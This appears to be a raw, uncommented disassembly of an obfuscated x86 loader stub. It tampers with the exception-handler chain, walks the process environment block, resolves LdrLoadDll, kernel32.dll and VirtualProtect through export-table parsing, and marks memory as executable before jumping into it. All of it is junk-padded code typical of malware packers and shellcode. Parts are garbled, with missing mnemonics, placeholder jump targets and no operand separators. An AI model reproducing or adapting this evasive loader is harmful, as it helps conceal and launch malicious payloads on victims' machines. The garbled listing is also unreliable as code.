_start
pushad
xor eax eax
push esp
inc eax
pop edx
test ecx ecx
adc eax 0x1
sub edx 0x4
inc eax
neg eax
call $+5
sub [ edx ] eax
retn
sub_67602025
mov eax 0x0
add eax 0x0
xor ebx ebx
or ebx eax
mov esi 0x0
sub esi eax
neg esi
stc
sbb bh 0x0
or esi esi
sbb bh 0x1
mov bl bh
call $+5
or esi esi
sbb esi 0xffffffff
mov edi 0x0
add edi [ esp ]
movzx ecx [ edi + esi - 0x2 ]
sub esp 0x4
mov [ esp ] ebx
and edi edi
sbb ebx ecx
pop ebx
jne r-xdata
add [ esp ] eax
jmp [ esp ]
xor eax eax
or eax esi
sub_676020ae
push [ fs : 0x0 ]
add ebx edx
mov esi 0x0
or esi 0xffff
not edi
and eax eax
adc ebx edx
mov [ fs : 0x0 ] esp
and ebx edi
and esi esi
adc ebx edx
jmp r-xdata
call $+5
test esi esi
sbb ebx edx
call $+5
mov [ esp ] eax
xor eax [ esp ]
test esi esi
adc esp 0x4
mov eax [ ebx ]
xor ecx ecx
or ecx 0x5a4d
and eax esi
add esp 0xfffffffc
mov [ esp ] eax
xor eax ecx
pop eax
je r-xdata
mov eax [ esp ]
add esp 0x4
sub eax eax
add eax [ esp ]
mov [ fs : 0x0 ] eax
add esp 0x8
push ebx
pop edx
push [ ebx + 0x3c ]
pop eax
add ebx eax
or edi edi
mov eax 0x0
adc eax 0x4550
xor ecx ecx
or ecx [ ebx ]
call $+5
mov [ esp ] ecx
xor ecx eax
pop ecx
jne r-xdata
jmp [ esp ]
popad
mov eax 0x0
sub eax 0x1
neg eax
retn 0xc
mov eax 0x0
or eax [ ebx + 0x78 ]
mov ebx eax
and edi edi
adc ebx edx
push ebx
push [ ebx + 0x20 ]
pop eax
mov ebx 0x0
sub ebx eax
neg ebx
add ebx edx
call $+5
mov [ esp ] edx
add esp 0xfffffffc
mov [ esp ] ebx
pop esi
mov ebx [ esp ]
add esp 0x4
add esp 0xfffffffc
mov [ esp ] edx
xor edx [ esp ]
or edx edx
sbb esp 0xfffffffc
xor eax eax
or eax esi
xor ecx ecx
add ecx [ esi ]
xor esi esi
add esi ecx
call $+5
push esp
pop ebp
and esi esi
adc esi ebx
sub esp 0x4
mov [ esp ] 0x6c6c
call $+5
mov [ esp ] 0x4464616f
sub esp 0x4
mov [ esp ] 0x4c72644c
mov edi 0x0
sub edi esp
neg edi
test ecx ecx
mov ecx 0x0
adc ecx 0xb
[ esi ] [ edi ]
je r-xdata
test edx edx
mov esp 0x0
adc esp ebp
mov esi [ esp ]
add esp 0x4
push ebx
add esp 0xfffffffc
mov [ esp ] edx
pop edi
pop edx
add esp 0x4
mov ebx [ esp - 0x4 ]
mov esi 0x0
or esi ebx
push [ ebx + 0x24 ]
pop eax
xor ebx ebx
xor ebx eax
add ebx edx
and eax 0x0
add eax [ ebx + edi * 2 ]
and eax 0xffff
mov edi 0x0
add edi eax
mov eax 0x0
add eax [ esi + 0x10 ]
sub edi eax
inc edi
test ebx ebx
mov ebx 0x0
adc ebx [ esi + 0x1c ]
test eax eax
adc ebx edx
xor eax eax
add eax [ ebx + edi * 4 ]
add edx eax
mov ebp 0x0
xor ebp esp
xor eax eax
call $+5
mov [ esp ] eax
test ebx ebx
mov ebx 0x0
adc ebx esp
call $+5
mov [ esp ] eax
add esp 0xfffffffc
mov [ esp ] 0x6c006c
sub esp 0x4
mov [ esp ] 0x64002e
call $+5
mov [ esp ] 0x320033
add esp 0xfffffffc
mov [ esp ] 0x6c0065
add esp 0xfffffffc
mov [ esp ] 0x6e0072
push 0x65006b
push esp
push 0x1a0018
mov ecx 0x0
sub ecx esp
neg ecx
add esp 0xfffffffc
mov [ esp ] ebx
push ecx
push eax
push eax
call $+5
mov [ esp ] edx
add esp 0xfffffffc
mov [ esp ] ebx
pop esi
mov ebx [ esp ]
add esp 0x4
call ebx
mov eax [ esi ]
call $+5
mov [ esp ] eax
pop eax
xor ecx ecx
or ecx [ fs : 0x30 ]
xor edx edx
add edx [ ecx + 0x10 ]
mov [ edx + 0x18 ] eax
mov esp 0x0
or esp ebp
mov ecx 0x0
sub ecx [ fs : 0x30 ]
neg ecx
test edi edi
mov edx 0x0
adc edx [ ecx + 0x10 ]
xor ebx ebx
add ebx [ edx + 0x18 ]
xor edx edx
or edx ebx
xor eax eax
xor eax [ ebx + 0x3c ]
and esi esi
adc ebx eax
mov eax 0x0
or eax [ ebx + 0x78 ]
push eax
pop ebx
add ebx edx
add esp 0xfffffffc
mov [ esp ] ebx
mov eax [ ebx + 0x20 ]
mov ebx 0x0
add ebx eax
add ebx edx
call $+5
mov [ esp ] edx
sub esp 0x4
mov [ esp ] ebx
add esp 0x4
mov esi [ esp - 0x4 ]
mov ebx [ esp ]
add esp 0x4
sub esp 0x4
mov [ esp ] edx
xor edx [ esp ]
test esi esi
sbb esp 0xfffffffc
mov eax 0x0
sub eax esi
neg eax
xor ecx ecx
xor ecx [ esi ]
test ecx ecx
mov esi 0x0
adc esi ecx
call $+5
mov ebp 0x0
add ebp esp
or eax eax
adc esi ebx
add esp 0xfffffffc
mov [ esp ] 0x7463
call $+5
mov [ esp ] 0x65746f72
sub esp 0x4
mov [ esp ] 0x506c6175
call $+5
mov [ esp ] 0x74726956
sub edi edi
add edi esp
sub ecx ecx
add ecx 0xf
[ esi ] [ edi ]
je r-xdata
test esi esi
sbb edx 0xffffffff
add eax 0x4
mov esi 0x0
or esi [ eax ]
mov esp ebp
jmp [ esp ]
sub esp esp
add esp ebp
pop esi
add esp 0xfffffffc
mov [ esp ] ebx
call $+5
mov [ esp ] edx
pop edi
add esp 0x4
mov edx [ esp - 0x4 ]
pop ebx
and esi 0x0
add esi ebx
and eax 0x0
add eax [ ebx + 0x24 ]
mov ebx 0x0
sub ebx eax
neg ebx
add ebx edx
mov eax 0x0
or eax [ ebx + edi * 2 ]
and eax 0xffff
xor edi edi
or edi eax
and eax 0x0
add eax [ esi + 0x10 ]
or eax eax
sbb edi eax
inc edi
mov ebx [ esi + 0x1c ]
or esi esi
adc ebx edx
xor eax eax
add eax [ ebx + edi * 4 ]
add edx eax
mov esi 0x0
sub esi 0x1000
neg esi
call $+5
mov ebx [ esp ]
add esp 0x4
and ebx 0xfffff000
add ebx esi
test ecx ecx
adc ebx esi
add esp 0xfffffffc
mov [ esp ] ebx
mov ecx 0x0
xor ecx 0x4
call $+5
add ebx esi
xor eax eax
add eax [ ebx ]
and ecx ecx
sbb ecx 0x1
je r-xdata
inc edx
add eax 0x4
sub esi esi
add esi [ eax ]
xor esp esp
or esp ebp
jmp [ esp ]
add esp 0x4
mov eax [ esp - 0x4 ]
add esp 0x4
mov ebx [ esp - 0x4 ]
add esp 0xfffffffc
mov [ esp ] eax
push esp
add esp 0xfffffffc
mov [ esp ] 0x40
call $+5
mov [ esp ] 0x45b7
sub esp 0x4
mov [ esp ] ebx
call $+5
mov [ esp ] edx
call $+5
mov [ esp ] ebx
pop esi
add esp 0x4
mov ebx [ esp - 0x4 ]
call $+5
pop eax
or edi edi
adc eax 0x19
call $+5
mov [ esp ] eax
push ebp
and ebp 0x0
add ebp esp
add ebx 0x5
jmp ebx
jmp [ esp ]
